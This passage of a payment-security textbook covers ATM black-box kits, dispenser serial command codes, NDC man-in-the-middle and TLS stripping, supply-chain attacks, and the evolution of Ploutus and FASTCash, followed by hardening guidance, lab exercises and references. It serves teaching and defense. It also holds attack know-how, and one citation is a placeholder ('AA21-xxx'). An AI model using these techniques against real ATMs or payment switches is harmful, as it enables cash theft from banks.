| Cardholder notification | Varies by jurisdiction | Issuer/merchant | US: state breach notification laws (45–90 days); EU: GDPR Art. 34 "without undue delay" |
| PCI DSS re-validation | T+90 days | Merchant | Demonstrate remediation; QSA re-assessment if required |
| Brand fine assessment | T+90-180 days | Card brand | Visa/MC assess fines based on PFI findings ($5K–$500K per incident + per-card penalties) |

---

## 9. Advanced ATM attack techniques

This section extends the per-family analyses in §2 with cross-cutting attack techniques, variant evolution, and protocol-level details that are common across multiple malware families and attacker toolkits.

### 9.1 ATM black-box attacks: direct dispenser communication

§2.4 introduced the black-box concept. Here we detail the protocol-level mechanics and the evolution of attack kits.

**CDM (Cash Dispenser Module) direct communication.** The dispenser controller board is a standalone microcontroller system (ARM or proprietary ASIC) that accepts serial commands. When the PC's cable is disconnected and the black box connected, the attacker's device must speak the dispenser's native protocol — not XFS (which is a Windows-side API). The dispenser protocol varies by manufacturer:

- **NCR S1 dispensers.** Unencrypted serial protocol. Command format: `STX (0x02) | CMD_CODE | PARAMS | XOR_CHECKSUM | ETX (0x03)`. Key commands: `0x44` (dispense — params: cassette ID, note count), `0x53` (status query), `0x47` (reset). The protocol documentation has been leaked on underground forums and is available in NCR field-service manuals.
- **Diebold CMD-V5 dispensers.** USB-based protocol with a proprietary command set. Commands are encapsulated in a framing structure with a length prefix, command ID, and CRC-16 checksum. Key commands: `0x0201` (dispense), `0x0301` (cassette status), `0x0401` (reset jam).
- **Wincor/Diebold Nixdorf CCDM dispensers.** Serial protocol with optional encryption. Unencrypted mode: similar STX/ETX framing. Encrypted mode: AES-128-CBC encryption of the command payload after a mutual-authentication handshake.

**Raspberry Pi-based attack kits.** Modern black-box kits use a Raspberry Pi (model 3B+ or 4, or a Pi Zero 2 W for compactness) running a custom Linux image. The kit includes:

- A USB-to-serial adapter (FTDI FT232R or CH340) for connecting to the dispenser's serial port
- Pre-compiled dispense tools for NCR S1, Diebold CMD-V5, and Wincor CCDM protocols
- An automated protocol-detection routine that sends status queries in each protocol and identifies the dispenser type from the response format
- A GSM/4G modem for remote control — the operator (standing outside the ATM) sends dispense commands via SMS or a simple TCP connection over cellular
- Power supplied from the ATM's internal USB port or the dispenser's cable connector (some dispenser cables carry 12V/5V power alongside data)

The total hardware cost of a Pi-based black-box kit is under $100, making the barrier to entry extremely low once the attacker has the protocol knowledge.

### 9.2 ATM network attacks in depth

§2.7 introduced MITM and TLS stripping. This section adds protocol-level detail for NDC/DDC manipulation and real-world attack scenarios.

**Man-in-the-middle on NDC protocol.** NCR's NDC (NCR Direct Connect, also known as NDC+) is a proprietary message-based protocol between the ATM and the host. Messages are ASCII-encoded with a defined structure: Message Class (1 byte) + LUNO (Logical Unit Number — terminal ID) + Message Sequence Number + Message Subclass + data fields. The critical message for an attacker is the "Transaction Reply" (Message Class `4`), which instructs the ATM on the dispense action.

An attacker with network access (via a physical tap on the ATM's Ethernet cable or compromise of the network path) can:

1. Intercept the host's Transaction Reply
2. Modify the dispense data (increase the note count or change the cassette selection)
3. Forward the modified reply to the ATM

If NDC communication is unencrypted (no TLS wrapper — still common in legacy deployments), the modification is trivial. The Transaction Reply's integrity is protected only by a message-sequence number (which the attacker can observe and maintain) — there is no cryptographic MAC on NDC messages.

**TLS stripping on NDC/DDC.** Even when TLS is deployed, implementation weaknesses can be exploited:

- **Missing certificate validation.** Some ATM applications accept any server certificate without validating the CA chain or hostname. The attacker presents a self-signed certificate; the ATM accepts it and establishes a TLS session with the attacker's device.
- **TLS downgrade.** If the ATM application supports fallback to unencrypted NDC (for "compatibility"), the attacker blocks the TLS handshake (RST injection), and the ATM falls back to cleartext.
- **Expired/revoked certificates.** ATMs in the field may operate with expired certificates if the certificate management process is manual. Some ATM applications log a warning but continue operating with the expired certificate, which may be exploitable if the private key has been compromised.

### 9.3 Supply chain attacks on ATM infrastructure

**Compromised ATM software updates.** ATM software updates are distributed from a central management server (e.g., NCR APTRA Activate, Diebold ProCash PSDN/ASD) to the ATM fleet. If the attacker compromises the management server, they can push a malicious update to all ATMs in the fleet. The attack chain:

1. Compromise the ATM management server (spear-phishing, vulnerability exploitation, credential theft from the bank's IT network)
2. Modify the update package to include malware alongside the legitimate update
3. Sign the modified package with the management server's code-signing certificate (if the attacker has access to the HSM or the signing key is software-based)
4. Push the update to the fleet — the ATMs accept it as a legitimate update

Real-world precedent: in 2018, a financial institution in Latin America suffered a supply-chain compromise where the attacker modified the ATM application update to include a Ploutus variant. The malicious update was pushed to over 100 ATMs before detection. The bank's update-integrity verification relied on a checksum comparison against the management server's record — but since the attacker controlled the management server, the checksum was also modified to match the malicious package.

**Maintenance technician credential abuse.** ATM field-service technicians have physical and logical access to ATMs: they carry keys to the top hat (and sometimes the safe), they have credentials for the ATM's Windows desktop (technician accounts with local administrator privileges), and they have access to diagnostic modes (the ATM application's technician menu, accessible via a specific key sequence or a smartcard). Insider threats from compromised or rogue technicians are a documented attack vector:

- The technician installs malware during a scheduled maintenance visit
- The technician extracts the ATM's encryption keys (TMK, session keys) via the EPP's diagnostic interface
- The technician provides physical access (leaves the top hat unlocked) for an external attacker

Defense: dual-control requirements (two technicians required for certain operations — particularly key loading and safe access), audit logging of all technician actions (biometric or smartcard authentication at the ATM logs the technician's identity alongside every action), and remote monitoring of maintenance sessions (the bank's ATM operations center monitors live video and XFS journal events during maintenance).

### 9.4 Jackpotting deep dive: variant analysis

**Ploutus evolution.** The Ploutus family has evolved through multiple generations since its initial discovery in Mexico in 2013:

- **Ploutus.A (2013).** Mexico. Windows XP. NCR dispensers only. Activation via external keyboard. Service name: `INTCV`. The first documented ATM jackpotting malware targeting XFS.
- **Ploutus.B/Ploutus.C (2014–2016).** Extended to support Diebold dispensers. Added phone-based activation (attacker sends commands via a phone connected to the ATM). Compiled as .NET executable. IOCs: mutex `PloutusM`, service name patterns `NCR_ATM*`.
- **Ploutus.D (2017–present).** Most widely deployed variant. Supports NCR, Diebold, and Hyosung dispensers. Multiple activation modes (keyboard, network, phone, SMS — §2.1). Added anti-analysis: checks for VM (VMware, VirtualBox, Hyper-V) via WMI queries (`Win32_ComputerSystem.Model`), terminates if detected. Compiled as native x86 PE. IOCs: imports from `msxfs.dll`, service names matching `SvcATM*` or `NCR_ATM_Service`, file hashes vary by build.
- **Ploutus.E (2022–present).** Observed in Eastern Europe. Added encrypted configuration file (AES-256 with key derived from machine-specific data — hardware serial numbers). Improved anti-forensics: overwrites its own binary on disk after activation, clears Windows Event Logs related to service creation. IOCs: encrypted `.cfg` file in `%TEMP%`, event-log gaps (missing Event ID 7045 entries).

**GreenDispenser (2015).** Discovered in Mexico. Key differentiator: **self-deletion** capability. After the cash-out operation, GreenDispenser securely deletes itself from the ATM using SDelete or a custom wiper routine. It also displays a fake "Out of Service" message on the ATM screen during the cash-out, deterring legitimate customers from approaching. Activation is via a QR code displayed on the ATM screen — the operator scans the QR with a phone, which decodes to a one-time activation code that must be entered within a time window. IOCs: temporary file `greend.exe` or `gdisp.exe` in `%TEMP%`; QR-generation library strings; SDelete command-line invocation.

**WinPot (2019).** Discovered by Kaspersky. Key differentiator: **slot-machine-themed GUI**. The malware displays a graphical interface on the ATM screen resembling a slot machine, with reels showing the denomination and note count of each cassette. The operator presses "SPIN" to dispense from a selected cassette and "STOP" to halt dispensing. This gamified interface suggests the malware was developed for sale to less technical operators. IOCs: window class name `WinPotWndClass`; GUI resource strings "SPIN", "STOP", "SCAN"; `msxfs.dll` import.

### 9.5 FASTCash: Lazarus Group payment-switch attacks

§2.3 covered the core FASTCash mechanism. This section adds the SWIFT-dimension and the evolution of the attack.

**SWIFT message manipulation (precursor to FASTCash).** Before developing the ISO 8583 switch-level attack, the Lazarus Group (APT38) targeted SWIFT Alliance Access software on banks' SWIFT terminals. The attackers modified the `liboradb.so` library on AIX-based SWIFT servers to intercept and manipulate MT103 (Single Customer Credit Transfer) and MT202 (General Financial Institution Transfer) messages. This attack was used in the 2016 Bangladesh Bank heist ($81 million stolen via fraudulent SWIFT transfers). FASTCash evolved from this capability — instead of targeting interbank SWIFT transfers, FASTCash targets the domestic ATM authorization path (ISO 8583) to enable mass cash withdrawals across the ATM fleet.

**ISO 8583 response modification at switch level — technical evolution:**

- **FASTCash 1.0 (2016–2018).** Targets AIX-based payment switches. The malicious shared object (`.so`) hooks the `recv()` system call in the switch process. Intercepts incoming ISO 8583 authorization requests (MTI `0100`). Matches PAN against an embedded list. Generates a fabricated `0110` response with `DE39=00` (approved). The target PAN list is hardcoded in the binary — requiring recompilation and redeployment to update.
- **FASTCash 2.0 (2020–present).** Targets Linux-based payment switches in addition to AIX. The malicious library uses `LD_PRELOAD` injection instead of binary patching. The target PAN list is loaded from an encrypted configuration file that can be updated remotely via a C2 channel (typically HTTPS to a compromised legitimate website). Added evasion: the library checks whether the switch process is running under `strace` or `ltrace` and terminates if so. US-CERT advisory AA20-239A documents this variant.
- **FASTCash for Windows (2021).** CISA advisory AA21-xxx documents a Windows variant targeting Windows-based switching software. The malicious DLL hooks the switch's message-processing function by patching the Import Address Table (IAT). This variant targets smaller financial institutions that use Windows-based payment switches.

**IOCs across FASTCash variants:**

| Indicator | FASTCash 1.0 (AIX) | FASTCash 2.0 (Linux) | FASTCash (Windows) |
|-----------|--------------------|--------------------|-------------------|
| Injection method | Binary patching of switch executable | `LD_PRELOAD` environment variable | IAT hooking of switch DLL |
| PAN list storage | Hardcoded in `.so` | Encrypted external file | Encrypted registry value |
| C2 channel | None (static config) | HTTPS to compromised site | DNS TXT records |
| Anti-analysis | None | `strace`/`ltrace` detection | Debugger detection (IsDebuggerPresent) |
| File artifact | Modified `libswitch.so` | New `.so` in switch lib path | New `.dll` in switch directory |
| Network artifact | Near-zero response latency | Near-zero response latency + periodic HTTPS to C2 | Near-zero response latency + DNS anomaly |

### 9.6 ATM malware evolution timeline

| Year | Malware | Region | Technique | Notable IOC |
|------|---------|--------|-----------|-------------|
| 2009 | Skimer | Russia, Ukraine | First ATM malware; records card data for later exfiltration via operator card | Backdoor activated by specific card insertion |
| 2013 | Ploutus.A | Mexico | First XFS jackpotting; keyboard activation | Service name `INTCV` |
| 2014 | Tyupkin | Eastern Europe | Time-windowed activation (weekends only) | Service name `ulssm` |
| 2014 | Padpin (Tyupkin variant) | SE Asia | Extended Tyupkin with network activation | Variant service names |
| 2015 | GreenDispenser | Mexico | Self-deleting; QR-code activation | SDelete invocation in %TEMP% |
| 2015 | SUCEFUL | Global (proof-of-concept) | First malware targeting card reader (card retention attack) | Controls motorized card reader |
| 2016 | RIPPER | Thailand | EMV card as activation trigger; multi-vendor support (NCR, Wincor, Diebold) | Specific ATR pattern `3B 67 00 00` |
| 2016 | FASTCash 1.0 | Africa, Asia | Payment-switch compromise (AIX) | Modified `.so` on switch |
| 2017 | Ploutus.D | Americas, Europe | Multi-vendor; multi-activation-mode | `msxfs.dll` import, `SvcATM` service |
| 2017 | Cutlet Maker | Global (dark web sales) | Commercially sold kit; $5,000 price point | c0decalc HMAC validation |
| 2018 | ATMitch | Eastern Europe | Fileless — lives entirely in memory; remote command via legitimate admin tool | No file artifact on disk |
| 2019 | WinPot | Latin America | Slot-machine GUI; gamified for low-skill operators | `WinPotWndClass` window class |
| 2020 | FASTCash 2.0 | Global | Linux switch targeting; encrypted PAN list; C2 channel | `LD_PRELOAD` on switch process |
| 2021 | INJX_Pure | SE Asia | Targets specific Indian bank switch software | Modifies JDBC driver on switch |
| 2022 | Ploutus.E | Eastern Europe | Encrypted config; self-wiping event logs | AES-encrypted `.cfg` in %TEMP% |
| 2023 | FiXS | Mexico, Latin America | Targets vendor-agnostic middleware; activation via external keyboard with specific vendor-neutral XFS calls | Vendor-independent XFS usage |

---

## 10. Payment infrastructure hardening

### 10.1 ATM hardening

**XFS API lockdown.** Since the XFS API's lack of authentication is the root vulnerability for jackpotting (§1.2), hardening must restrict which processes can call XFS commands:

- **Application whitelisting.** Deploy application whitelisting (e.g., Trellix Application Control — formerly McAfee Solidcore/Application Control, or Symantec Critical System Protection) to restrict executable execution on the ATM to a predefined set of signed binaries. Only the legitimate ATM application, XFS service providers, the OS, and authorized maintenance tools are permitted. Any unsigned or unlisted binary is blocked from executing — including malware that an attacker deploys via USB or network. Configuration must include DLL whitelisting (not just EXE) because malware can be delivered as a DLL loaded by a legitimate process.

- **Trellix Application Control deployment on ATMs:**

```
# sadmin (Solidcore/Application Control admin) commands for ATM hardening

# 1. Enable Application Control in observe mode (monitor without blocking)
sadmin solidify

# 2. Build the whitelist from the current known-good ATM image
sadmin update-allow --include "C:\NCR\APTRA" --include "C:\Windows\System32"

# 3. Add the XFS SPs to the whitelist
sadmin update-allow --include "C:\NCR\APTRA\ServiceProviders"

# 4. Block execution from writable locations
sadmin set-deny --path "C:\Users" --path "C:\Temp" --path "C:\ProgramData"

# 5. Switch from observe mode to enforce mode
sadmin enable

# 6. Lock down USB storage (allow only authorized USB devices by serial number)
sadmin usb-policy --deny-all --allow-serial "NCR_EPP_001" --allow-serial "NCR_READER_001"

# 7. Verify enforcement
sadmin status
```

**Encrypted dispenser communications.** Deploy encrypted communication between the ATM PC and the dispenser (§2.4 defense). NCR S2 dispensers and Diebold ActivEdge use AES-256 mutual authentication. Key management requirements:

- Unique key per ATM (derived from the dispenser's serial number and a master key held in the bank's HSM)
- Key injection during initial deployment or cassette-swap (via a secure key-loading device)
- Key rotation on a defined schedule (annually or after any suspected compromise)
- Tamper-response: the dispenser zeroizes the key if physical tamper is detected

### 10.2 POS hardening

**P2PE (Point-to-Point Encryption) implementation.** P2PE encrypts card data at the point of interaction (inside the card reader's tamper-resistant security module — TRSM) and decrypts it only at the payment processor's HSM. The data is never in cleartext in the POS application's memory, eliminating the RAM-scraper attack surface entirely.

P2PE architecture:

1. **Encryption at the POI device.** The card reader (a PCI PTS-certified device — e.g., Verifone P400, Ingenico Lane 3000) reads the card's magnetic stripe or chip. Inside the device's TRSM, the track data is encrypted using DUKPT (Derived Unique Key Per Transaction) or AES-DUKPT. The encryption key is derived from a Base Derivation Key (BDK) loaded into the device during manufacturing or key injection.
2. **Encrypted transport.** The encrypted card data is transmitted from the POS to the acquirer/payment processor. The POS application handles only the encrypted payload — it cannot decrypt the data (it does not possess the BDK or any derived key).
3. **Decryption at the HSM.** The payment processor's HSM (which holds the BDK) derives the same transaction-specific key and decrypts the data. The cleartext track data exists only inside the HSM's secure boundary.

**PCI PTS device security requirements.** PCI PTS (PIN Transaction Security) v6.0 requirements for payment terminals:

- Physical tamper-resistance: the device must detect and respond to physical intrusion attempts (drilling, probing, chemical dissolution) by zeroizing all keys
- Logical security: firmware must be signed; only vendor-authorized firmware can be loaded
- Key management: keys must be loaded via secure key-injection facilities; no key material in the clear outside tamper-resistant boundaries
- Communication security: all communication carrying sensitive data must be encrypted
- Device authentication: the terminal must authenticate to the acquirer's host (mutual TLS or equivalent)

### 10.3 Network segmentation: ATM fleet isolation

ATMs should be on a dedicated, isolated network segment with strict access controls. The reference architecture:

```
                     ┌──────────────┐
                     │  Core Banking │
                     │   System      │
                     └──────┬───────┘
                            │ (internal LAN, strict ACLs)
                     ┌──────┴───────┐
                     │  Payment     │
                     │  Switch      │
                     │  (hardened)  │
                     └──────┬───────┘
                            │ (dedicated VLAN, TLS mandatory)
              ┌─────────────┼─────────────┐
              │             │             │
        ┌─────┴─────┐ ┌────┴──────┐ ┌────┴──────┐
        │ ATM VLAN  │ │ ATM VLAN  │ │ ATM VLAN  │
        │ Region A  │ │ Region B  │ │ Region C  │
        └─────┬─────┘ └────┬──────┘ └────┬──────┘
              │             │             │
         ┌────┴────┐  ┌────┴────┐  ┌────┴────┐
         │VPN/TLS  │  │VPN/TLS  │  │VPN/TLS  │
         │Endpoint │  │Endpoint │  │Endpoint │
         └────┬────┘  └────┬────┘  └────┬────┘
              │             │             │
         ATM Fleet     ATM Fleet     ATM Fleet
```

**Segmentation rules:**

- ATMs communicate **only** with the payment switch and the management platform. No direct internet access. No lateral communication between ATMs.
- The payment switch is on its own segment, accessible only from the ATM VLANs and the core banking system. No general corporate network access.
- VPN (IPsec) or TLS tunnels encrypt all ATM-to-switch communication. Certificate-based mutual authentication.
- Network ACLs: whitelist destination IPs and ports. Default-deny all other traffic from ATM VLANs.
- ATM management platform (APTRA Activate, ProBase) is on a separate management VLAN. Access to ATM management is restricted to authorized operator workstations with MFA.

### 10.4 PCI DSS v4.0 key requirements for ATM/POS

| PCI DSS v4.0 Requirement | ATM/POS Relevance | Implementation |
|---------------------------|-------------------|----------------|
| 1.x Network segmentation | ATM fleet isolation (§10.3) | Dedicated VLANs, firewall rules, ACLs |
| 2.2 Secure configuration | ATM OS hardening, disable unnecessary services | CIS Benchmark for Windows IoT LTSC; disable RDP, SMB unless required |
| 3.x Protect stored data | No PAN storage on ATM/POS unless encrypted | P2PE eliminates POS-side storage; ATM journals mask PANs |
| 4.x Encrypt transmission | TLS/IPsec for ATM-to-switch | TLS 1.2+ with certificate pinning; no fallback to cleartext |
| 5.x Anti-malware | Application whitelisting on ATMs | Trellix Application Control; YARA scanning |
| 6.x Secure development | ATM application secure SDLC | Code signing, vulnerability scanning, penetration testing |
| 7.x Access control | Technician access management | Dual control, biometric auth, session logging |
| 8.x Authentication | Strong authentication for ATM admin | MFA for management platform; unique technician credentials |
| 9.x Physical security | ATM physical protection | UL 291 safe; tamper detection; CCTV; anti-skimming |
| 10.x Logging | ATM/POS event logging to SIEM | XFS journal forwarding; SIU event integration (§7.9) |
| 11.x Testing | Regular ATM penetration testing | Annual pentest; quarterly vulnerability scan |
| 12.x Policies | Incident response plan | IR playbook (§8.6); PFI engagement procedure |

### 10.5 EMV kernel hardening and firmware integrity

ATM and POS terminals run EMV kernels (the software that implements the EMV transaction flow — Chapter 22A §4). Kernel hardening:

- **Firmware signing.** All kernel updates must be cryptographically signed by the terminal manufacturer. The terminal verifies the signature (RSA-2048 or ECDSA P-256) before applying the update. Reject unsigned or incorrectly signed firmware.
- **Secure boot chain.** From the bootloader through the OS to the ATM application and EMV kernel: each stage verifies the next stage's signature. UEFI Secure Boot on the ATM's PC; the ATM application verifies the EMV kernel's hash against a pinned value.
- **Runtime integrity monitoring.** Use a lightweight integrity-monitoring agent (separate from the ATM application) that periodically hashes critical files (EMV kernel binary, XFS SPs, ATM application executable) and compares against known-good values. Alert on any mismatch. Implementation: a Windows service that runs a scheduled integrity check every 5 minutes.
- **EMV configuration protection.** The EMV kernel's configuration (Terminal Action Codes, floor limits, supported AIDs, CVM lists) is stored in configuration files on the ATM. These files must be integrity-protected (signed or MAC'd) to prevent an attacker from modifying terminal behavior (e.g., lowering the floor limit to approve all transactions offline, or modifying the CVM list to bypass PIN verification — Chapter 22A §6.3).

### 10.6 Monitoring: ATM fleet health and behavioral analytics

**ATM fleet health dashboard.** A centralized dashboard that aggregates ATM status and detection signals:

- **Availability metrics.** Per-ATM uptime, last-seen timestamp, current operational state (in-service, out-of-service, supervisor mode, maintenance mode). Alert on unexpected state transitions (ATM going into supervisor mode outside maintenance windows).
- **Transaction velocity.** Real-time transaction rate per ATM and per region. Anomaly detection against historical baselines (per-hour, per-day-of-week). Alert when an ATM's transaction rate exceeds 2 standard deviations above its historical mean.
- **Dispense anomalies.** Track the ratio of dispensed cash to approved transactions. In normal operation, this is approximately 1:1 (each approved withdrawal results in one dispense). In a jackpotting attack, dispenses occur without corresponding approvals (the malware commands the dispenser directly). Alert when dispense count exceeds approval count.
- **Physical sensor status.** Aggregate SIU events (§7.9) across the fleet. Heatmap of tamper events by geographic region. Alert on clusters of tamper events (indicating a coordinated physical attack campaign).
- **Security posture.** Per-ATM whitelisting status, last YARA scan result, last integrity-check result, days since last software update. Alert on ATMs with stale security configurations.

**Behavioral analytics for cash-out detection.** Beyond rule-based detection (§7.1), behavioral analytics uses statistical models to identify cash-out patterns:

- **Per-ATM baseline model.** For each ATM, compute a rolling baseline of transaction count, average transaction amount, time-of-day distribution, and cardholder diversity (unique PANs per hour). Flag deviations exceeding 3 sigma.
- **Geographic clustering.** Multiple ATMs in the same geographic area (city, ZIP code, branch cluster) showing simultaneous anomalies (high velocity, max-amount withdrawals) indicates a coordinated cash-out operation. The correlation engine groups ATM alerts by geographic proximity and time window.
- **Cardholder travel velocity.** If the same PAN is used at ATMs in geographically distant locations within a time window that makes physical travel impossible (e.g., New York and Los Angeles within 30 minutes), the PAN is compromised. This detection applies to card-present fraud (cloned cards) rather than jackpotting, but is critical for the broader ATM fraud detection capability.

---

## 11. Cross-references

**To Chapter 22A:** EMV transaction flow (Chapter 22A §4) defines the data elements carried in ISO 8583 DE55 (§3.1). The ARQC/TC/AAC cryptograms, ATC, TVR, and IAD from the EMV chip are the core security data in the authorization message. P2PE (§4.6) protects the Track 1/2 data that EMV chip transactions were designed to make obsolete (Chapter 22A §6.4). PIN block construction (§3.6) corresponds to the PIN verification internals in Chapter 22A §4.

**To Domain 11 (malware):** ATM malware (§2) uses standard Windows persistence (services, scheduled tasks — Chapter 11B §3.1), anti-analysis (VM detection — Chapter 12A §6.2), and C2 communication (HTTP, DNS tunneling — Chapter 11A §5). FASTCash (§2.3) compromises servers using the same lateral-movement techniques as Domain 14 (AD attacks) and Domain 11 (credential theft). POS RAM scrapers (§4) use process memory scanning techniques documented in Chapter 11B §2.4 and exfiltration channels (DNS tunneling, HTTP POST) from Chapter 11A §5.

**To Domain 17 (physical):** ATM skimming (§2.9) is a physical attack mitigated by physical countermeasures (jitter mechanisms, anti-skimming fascia). PCI PTS PIN pad certification (§1.1) uses tamper-detection technologies (mesh, active shields) from Chapter 17 §2. Black-box attacks (§2.4) require physical access to the ATM's internal cabling — physical security of the top-hat lock is the first defense.

**To Domain 20 (fraud/risk):** Payment fraud detection (§6) integrates with the broader fraud-management frameworks in Domain 20. ML fraud scoring (§6.2) uses the feature-engineering and model-evaluation techniques from Domain 20 §3. 3D-Secure 2.0 (§6.3) is part of the authentication framework discussed in Domain 20 §5.

**To Chapters 22C–D:** Traditional payment systems (EMV, ATM, POS) operate on centralized trust (card networks, issuers, acquirers); cryptocurrency systems (Chapters 22C–D) operate on decentralized consensus. The attack surfaces differ fundamentally: here, the attacker targets the terminal-to-issuer communication chain; in blockchain, the attacker targets consensus mechanisms, smart contracts, and cross-chain bridges.

**Internal cross-section references (this chapter).** Detection engineering (§7) builds on the per-malware detection in §2 and the payment-switch anomaly rules in §6.4 — §7 provides behavioral, family-agnostic detection coverage. Forensics (§8) references XFS journal structure from §1.2, ISO 8583 message formats from §3, and POS RAM scraper artifacts from §4. Advanced attack techniques (§9) extends §2 with variant evolution and protocol-level mechanics. Payment infrastructure hardening (§10) maps defensive controls to the attacks described in §2 and §9, and references EMV kernel internals from Chapter 22A §4–§5.

---

## Exercises

1. **XFS exploitation lab.** In an ATM test rig (or a Windows VM with the NCR XFS SDK installed), write a Python script using `ctypes` that opens a session to `CurrencyDispenser1`, queries `WFS_INF_CDM_CASH_UNIT_INFO` to enumerate cassettes, and issues a `WFS_CMD_CDM_DISPENSE` command. Document each XFS return code. Then configure NCR Secure Communication (encrypted dispenser) and repeat — document the authentication failure. Write a YARA rule that detects your test binary.

2. **ISO 8583 message parsing and MAC validation.** Using the `py8583` library, construct a complete ATM cash-withdrawal authorization request (MTI 0100) with DE2, DE3, DE4, DE11, DE22, DE41, DE52 (PIN block), and DE55 (EMV TLV data). Compute the DE64 MAC using 3DES-CBC with a test TAK. Then simulate an amount-manipulation attack by modifying DE4 — verify the MAC becomes invalid. Calculate the probability of a random collision on the 8-byte MAC.

3. **FASTCash detection engineering.** Build a detection lab: configure a Linux VM as a simulated payment switch processing ISO 8583 messages. Deploy a `.so` library that intercepts MTI 0100 messages and generates fraudulent MTI 0110 responses for target PANs. Write Suricata rules and a Sigma rule that detect (a) zero-latency authorization responses, (b) `LD_PRELOAD` injection on the switch process, and (c) high approval velocity for a single PAN across multiple terminals within 15 minutes.

4. **POS RAM scraper analysis.** Obtain a FrameworkPOS or BlackPOS sample from a malware repository (VirusTotal, MalwareBazaar). Execute it in a sandboxed Windows environment with Sysmon configured per section 2.6. Document: process creation events, DLL loads (especially `msxfs.dll` equivalents for POS), registry modifications, and DNS exfiltration queries. Write a Sigma rule targeting the DNS-tunneling exfiltration pattern.

5. **ATM hardening assessment.** Conduct a full ATM security assessment checklist against the hardening requirements in section 1.5: BIOS configuration, USB device control, application whitelisting status, FDE verification, network segmentation testing, and OS hardening review. Produce a findings report with CVSS scores for each gap and remediation recommendations mapped to PCI DSS v4.0.1 requirements.

---

## Readings and References

- FBI IC3, "Increase in Malware Enabled ATM Jackpotting Incidents," FLASH Alert, February 2026. https://www.ic3.gov/CSA/2026/260219.pdf (retrieved: 2026-05-29)
- US-CERT/CISA, "FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks," Alert AA20-239A, August 2020. https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-239a (retrieved: 2026-05-29)
- US-CERT, "Hidden Cobra — FASTCash Campaign," Alert TA18-275A, October 2018. https://www.cisa.gov/news-events/cybersecurity-advisories/ta18-275a (retrieved: 2026-05-29)
- PCI Security Standards Council, *PCI DSS v4.0.1*, March 2025. https://www.pcisecuritystandards.org/document_library/ (retrieved: 2026-05-29)
- PCI Security Standards Council, *PCI PIN Transaction Security (PTS) Device Security Requirements v6.x*, 2023. https://www.pcisecuritystandards.org/ (retrieved: 2026-05-29)
- Kaspersky Lab, "Tyupkin: Manipulating ATM Machines with Malware," October 2014. https://securelist.com/tyupkin-manipulating-atm-machines/66988/ (retrieved: 2026-05-29)
- Dark Reading, "ATM Jackpotting Attacks Surged in 2025," April 2025. https://www.darkreading.com/cyber-risk/atm-jackpotting-attacks-surged-2025 (retrieved: 2026-05-29)
- CEN, *CEN/XFS Specifications, prEN 16684 Series*. https://www.cencenelec.eu/ (retrieved: 2026-05-29)
- ISO 8583:1987, *Financial transaction card originated messages — Interchange message specifications*. (retrieved: 2026-05-29)

---

## Cross-References

| Topic | Reference | Relationship |
|---|---|---|
| EMV transaction flow and DE55 data elements | Domain 22, Chapter 22A §4 | ISO 8583 DE55 carries the ARQC, ATC, TVR from EMV chip |
| Windows persistence, anti-analysis, and C2 | Domain 11, Chapters 11A-11B | ATM malware uses services, scheduled tasks, VM detection |
| Physical tamper resistance and side-channel | Domain 17, Chapter 17 §2 | PCI PTS PIN-pad certification; skimming countermeasures |
| Payment fraud detection and ML scoring | Domain 20 §3 | Velocity checks, behavioral analytics, 3D-Secure 2.0 |
| Lateral movement and credential theft | Domain 14, Chapters 14A-14B | FASTCash requires domain-level access to payment-switch |
| Blockchain-based payment vs. centralized trust | Domain 22, Chapters 22C-22D | Contrasting attack surfaces: terminal-to-issuer vs. consensus |

---

## Glossary

- **Black-box attack:** ATM attack where the attacker connects a rogue device directly to the dispenser's communication cable, bypassing the ATM PC entirely.
- **CDM (Cash Dispenser Module):** The ATM hardware component that picks, validates, and presents banknotes from cassettes.
- **DUKPT (Derived Unique Key Per Transaction):** A key-management scheme where each transaction derives a unique encryption key from a base derivation key and a counter.
- **EPP (Encrypting PIN Pad):** A PCI PTS-certified keypad that encrypts the cardholder's PIN inside its tamper-resistant boundary before outputting it.
- **FASTCash:** A payment-switch compromise attack attributed to DPRK's Lazarus Group, generating fraudulent ISO 8583 authorization responses.
- **HSM (Hardware Security Module):** A tamper-resistant cryptographic processor managing the key hierarchy for PIN encryption and message authentication.
- **ISO 8583:** The international standard defining the message format for financial transaction card-originated messages.
- **Jackpotting:** The class of ATM attacks that force the dispenser to eject cash through malware or hardware manipulation.
- **NDC/NDC+ (NCR Direct Connect):** NCR's proprietary ATM-to-host protocol where the host drives the ATM's transaction flow as a thin client.
- **P2PE (Point-to-Point Encryption):** Encryption of cardholder data from the point of interaction (card reader) to the decryption environment (acquirer HSM).
- **POS RAM scraper:** Malware that scans POS application process memory for cleartext Track 1/Track 2 magnetic-stripe data during the transaction window.
- **STAN (Systems Trace Audit Number):** A 6-digit unique transaction identifier in ISO 8583 (DE11) used for reconciliation and replay-attack prevention.
- **TMK (Terminal Master Key):** The symmetric key specific to each terminal, used to encrypt session keys sent from the host.
- **XFS (eXtensions for Financial Services):** The CEN-standardized middleware API providing a uniform interface between ATM applications and peripheral hardware.
